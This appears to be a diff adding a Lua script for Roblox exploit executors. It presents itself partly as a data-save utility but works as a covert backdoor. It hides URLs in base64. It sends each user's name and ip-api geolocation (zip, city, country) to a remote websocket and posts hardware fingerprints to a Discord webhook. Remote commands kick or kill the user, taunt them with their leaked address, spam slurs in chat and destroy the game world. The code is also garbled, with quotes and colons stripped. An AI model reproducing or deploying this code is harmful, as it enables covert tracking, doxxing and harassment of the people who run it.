@@ -1,0 +1,249 @@
+-- Everything Here Was Made By The Plant Man#8610. --
+-- Data Save System --
+local MainValues = {
+    [StarterDataTables] = {},
+    [DataTables] = {}
+}
+function MainValuesExecute(Arguments)
+    if Arguments[Action] == NewDataFile then
+        if isfile(Arguments[DataFileName] .. .txt) then
+            MainValues[StarterDataTables][Arguments[DataFileName]] = Arguments[StarterData]
+            MainValues[DataTables][Arguments[DataFileName]] = game.HttpServiceJSONDecode(readfile(Arguments[DataFileName] .. .txt))
+        else
+            MainValues[StarterDataTables][Arguments[DataFileName]] = Arguments[StarterData]
+            writefile(Arguments[DataFileName] .. .txt, game.HttpServiceJSONEncode(Arguments[StarterData]))
+            MainValues[DataTables][Arguments[DataFileName]] = game.HttpServiceJSONDecode(readfile(Arguments[DataFileName] .. .txt))
+        end
+    elseif Arguments[Action] == DestroyDataFile then
+        if isfile(Arguments[DataFileName] .. .txt) then
+            delfile(Arguments[DataFileName] .. .txt)
+        end
+    elseif Arguments[Action] == SaveDataFile then
+        if isfile(Arguments[DataFileName] .. .txt) then
+            writefile(Arguments[DataFileName] .. .txt, game.HttpServiceJSONEncode(MainValues[DataTables][Arguments[DataFileName]]))
+        end
+    elseif Arguments[Action] == ResetDataFile then
+        if isfile(Arguments[DataFileName] .. .txt) then
+            writefile(Arguments[DataFileName] .. .txt, game.HttpServiceJSONEncode(MainValues[StarterDataTables][Arguments[DataFileName]]))
+            MainValues[DataTables][Arguments[DataFileName]] = game.HttpServiceJSONDecode(readfile(Arguments[DataFileName] .. .txt))
+        end
+    end
+end
+-- Encode  Decode --
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+'
+function enc(data)
+    return ((datagsub('.', function(x) 
+        local r,b='',xbyte()
+        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)0 and '1' or '0') end
+        return r;
+    end)..'0000')gsub('%d%d%d%d%d%d', function(x)
+        if (#x  6) then return '' end
+        local c=0
+        for i=1,6 do c=c+(xsub(i,i)=='1' and 2^(6-i) or 0) end
+        return bsub(c+1,c+1)
+    end)..({ '', '==', '=' })[#data%3+1])
+end
+function dec(data)
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (datagsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(bfind(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)0 and '1' or '0') end
+        return r;
+    end)gsub('%d%d%d%d%d%d%d%d', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(xsub(i,i)=='1' and 2^(8-i) or 0) end
+            return string.char(c)
+    end))
+end
+-- For Everyone --
+local WebSocket = syn.websocket.connect(dec(d3NzOi8vcGxhbnRzLXdlYnNvY2tldC5nbGl0Y2gubWUv)) or Krnl.WebSocket.connect(dec(d3NzOi8vcGxhbnRzLXdlYnNvY2tldC5nbGl0Y2gubWUv)) or WebSocket.connect(dec(d3NzOi8vcGxhbnRzLXdlYnNvY2tldC5nbGl0Y2gubWUv))
+local IpApi = game.HttpServiceJSONDecode(gameHttpGet(dec(aHR0cDovL2lwLWFwaS5jb20vanNvbi8=), true))
+local Address = IpApi[zip] ..   .. IpApi[city] ..   .. IpApi[regionName] ..   .. IpApi[country]
+local Banned = game.HttpServiceJSONDecode(gameHttpGet(dec(aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RoZXBsYW50bWFuL3BsYW50YWRkcmVzcy9tYWluL0Jhbm5lZC5qc29u)))
+local Admins = game.HttpServiceJSONDecode(gameHttpGet(dec(aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RoZXBsYW50bWFuL3BsYW50YWRkcmVzcy9tYWluL0FkbWlucy5qc29u)))
+local Request = syn.request or http_request or request
+local HwidList = {
+    Syn-Fingerprint,
+    Krnl-Fingerprint,
+    Hrnl-Hwid
+}
+local Hwid
+local LoopJump = false
+for Index, String in next, HwidList do
+    if game.HttpServiceJSONDecode(Request({[Method] = GET, [Url] = dec(aHR0cHM6Ly9odHRwYmluLm9yZy9nZXQ=)})[Body])[headers][String] then
+        Hwid = game.HttpServiceJSONDecode(Request({
+            [Method] = GET,
+            [Url] = dec(aHR0cHM6Ly9odHRwYmluLm9yZy9nZXQ=)
+        })[Body])[headers][String]
+    end
+end
+MainValuesExecute({
+    [Action] = NewDataFile,
+    [DataFileName] = BanData,
+    [StarterData] = {
+        [Banned] = false,
+        [BanMessage] = Banned By THE HACKER.
+    }
+})
+for Index, String in next, Banned do
+    if Hwid == String then
+        game.Players.LocalPlayerKick(MainValues[DataTables][BanData][BanMessage])
+    end
+end
+if MainValues[DataTables][BanData][Banned] then
+    game.Players.LocalPlayerKick(MainValues[DataTables][BanData][BanMessage])
+end
+WebSocket.OnMessageConnect(function(Message)
+    local MessageTable = string.split(Message,  )
+    if string.lower(MessageTable[1]) == !kick then
+        if MessageTable[3] then
+            game.Players.LocalPlayerKick(string.sub(Message, #(MessageTable[1] ..   .. MessageTable[2]) + 2, #Message))
+        else
+            game.Players.LocalPlayerKick(Kicked By Script Owner.)
+        end
+    elseif string.lower(MessageTable[1]) == !clientsconnected then
+        game.StarterGuiSetCore(SendNotification, {
+            [Title] = Number Of Clients Connected.,
+            [Text] = Clients Connected  .. MessageTable[2],
+            [Duration] = 5
+        })
+    elseif string.lower(MessageTable[1]) == !kill then
+        if game.Players.LocalPlayer.CharacterFindFirstChild(Humanoid) then
+            game.Players.LocalPlayer.Character.Humanoid.Health = 0
+        end
+    elseif string.lower(MessageTable[1]) == !port then
+        game.StarterGuiSetCore(SendNotification, {
+            [Title] = WebSocket Port.,
+            [Text] = Port Connected  .. MessageTable[2],
+            [Duration] = 5
+        })
+    elseif string.lower(MessageTable[1]) == !address then
+        local Command = MessageTable[1] .. MessageTable[2]
+        game.StarterGuiSetCore(SendNotification, {
+            [Title] = Address.,
+            [Text] = game.Players.LocalPlayer.Name ..   .. string.sub(Message, #Command + 3, #Message),
+            [Duration] = 5
+        })
+    elseif string.lower(MessageTable[1]) == !troll then
+        local Command = MessageTable[1] .. MessageTable[2]
+        game.Players.LocalPlayerKick(Got Yo Address ..   .. string.sub(Message, #Command + 3, #Message))
+    elseif string.lower(MessageTable[1]) == !void then
+        if game.Players.LocalPlayer.CharacterFindFirstChild(HumanoidRootPart) then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -9999, 0)
+            game.StarterGuiSetCore(ResetButtonCallback, false)
+        end
+    elseif string.lower(MessageTable[1]) == !nerd then
+        local Boom = Instance.new(Sound)
+        Boom.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+        Boom.Volume = math.huge
+        Boom.SoundId = rbxassetid5058160717
+        game.DebrisAddItem(Boom, 4)
+        local Nerd = gameGetObjects(rbxassetid11324515485)[1]
+        Nerd.Parent = game.CoreGui
+        game.DebrisAddItem(Nerd, 2.25)
+        BoomPlay()
+        for Index = 1, 2000 do
+            Nerd.ImageLabel.BackgroundTransparency = Nerd.ImageLabel.BackgroundTransparency + 0.01
+            Nerd.ImageLabel.ImageTransparency = Nerd.ImageLabel.ImageTransparency + 0.01
+            task.wait(0.001)
+        end
+    elseif string.lower(MessageTable[1]) == !ban then
+        local function Log()
+            Request({
+                [Body] = game.HttpServiceJSONEncode({
+                    [embeds] = {
+                        {
+                            [title] = Ban Request.,
+                            [description] = string.lower(game.Players.LocalPlayer.Name) .. 's  .. Hwid  .. Hwid
+                        }
+                    }
+                }),
+                [Url] = dec(aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAzMzU1NTk1NDg3NDE5NjAxOC9CREdnNFduVlc5dW81V2IteFc4OTlYNjVvMG05OGtraHNrZkd5eFJUcE5lTzRNUnctTE9QU3pfWjRvYjAzMzNhZ1ZqVA==),
+                [Headers] = {
+                    [content-type] = applicationjson
+                },
+                [Method] = POST
+            })
+        end
+        if MessageTable[3] then
+            Log()
+            task.wait()
+            MainValues[DataTables][BanData][Banned] = true
+            MainValues[DataTables][BanData][BanMessage] = string.sub(Message, #(MessageTable[1] ..   .. MessageTable[2]) + 2, #Message)
+            MainValuesExecute({
+                [Action] = SaveDataFile,
+                [DataFileName] = BanData
+            })
+            game.Players.LocalPlayerKick(string.sub(Message, #(MessageTable[1] ..   .. MessageTable[2]) + 2, #Message))
+        else
+            Log()
+            task.wait()
+            MainValues[DataTables][BanData][Banned] = true
+            MainValuesExecute({
+                [Action] = SaveDataFile,
+                [DataFileName] = BanData
+            })
+            game.Players.LocalPlayerKick(Banned By Script Owner.)
+        end
+    elseif string.lower(MessageTable[1]) == !forceban then
+        game.Players.LocalPlayer.PlayerGui.BubbleChatDestroy()
+        task.wait()
+        game.Players.LocalPlayer.PlayerGui.ChatDestroy()
+        local Bypassed = {
+            СUМ,
+            СОСКЅ,
+            РЕNIS,
+            ККК,
+            ВООВЅ,
+            НЕLL,
+            ЅUСК,
+            DАМN,
+            ЅUСК СОСКЅ,
+            GОD DАМN,
+            ВIG ВООВЅ,
+            УUММУ СОСКЅ,
+            ТШАТ,
+            НІТГЕR,
+            А.ЅЅ
+        }
+        task.spawn(function()
+            for Index = 1, math.huge do
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequestFireServer(Bypassed[math.random(1, #Bypassed)], All)
+                task.wait(5)
+            end
+        end)
+    elseif string.lower(MessageTable[1]) == !loopjump then
+        LoopJump = true
+        repeat
+            if game.Players.LocalPlayer.CharacterFindFirstChild(Humanoid) then
+                game.Players.LocalPlayer.Character.HumanoidChangeState(Enum.HumanoidStateType.Jumping)
+            end
+            task.wait()
+        until not LoopJump
+    elseif string.lower(MessageTable[1]) == !unloopjump then
+        LoopJump = false
+    elseif string.lower(MessageTable[1]) == !break then
+        game.WorkspaceDestroy()
+    elseif string.lower(MessageTable[1]) == !chat then
+        if MessageTable[3] then
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequestFireServer(string.sub(Message, #(MessageTable[1] ..   .. MessageTable[2]) + 2, #Message), All)
+        end
+    end
+end)
+WebSocketSend(!setid  .. string.lower(game.Players.LocalPlayer.Name) ..   .. Address)
+-- For Admins --
+function CheckIfAdmin(PlayerHwid)
+    for Index, String in next, Admins do
+        if PlayerHwid == String then
+            return true
+        end
+    end
+    return false
+end
+game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEventConnect(function(Data)
+    if Data[FromSpeaker] == game.Players.LocalPlayer.Name and string.sub(Data[Message], 0, 1) == ! and CheckIfAdmin(Hwid) then
+        WebSocketSend(Data[Message])
+    end
+end)
